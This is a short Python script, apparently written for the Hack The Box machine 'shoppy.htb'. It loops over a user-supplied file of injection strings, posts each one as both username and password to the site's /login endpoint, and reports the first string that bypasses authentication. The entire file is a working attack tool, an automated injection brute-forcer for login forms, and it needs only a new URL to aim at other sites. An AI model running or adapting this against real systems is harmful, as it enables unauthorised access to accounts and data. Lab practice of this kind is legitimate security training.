import requests
import argparse

parser = argparse.ArgumentParser(description='SQL Injection using a list of queries.')
parser.add_argument('list', metavar='[path]', type=str, help='path to queries list', )
args = parser.parse_args()

url = "http://shoppy.htb"
path = "/login"

with open(args.list, "r") as queries:
	lines = queries.readlines()
	for line in lines:
		line = line.strip()
		try:
			print("Trying " + line)
			r = requests.post(url + path, json={"username": line, "password": line}, timeout=1)
			try:
				if (r.url.split("=")[1]) == "WrongCredentials":
					print("Did not work... going next.")
			except:
				print(" Worked!!!")
				print("Query: " + line)
				break
		except:
			print("Connection Error!")
	print("Quitting...")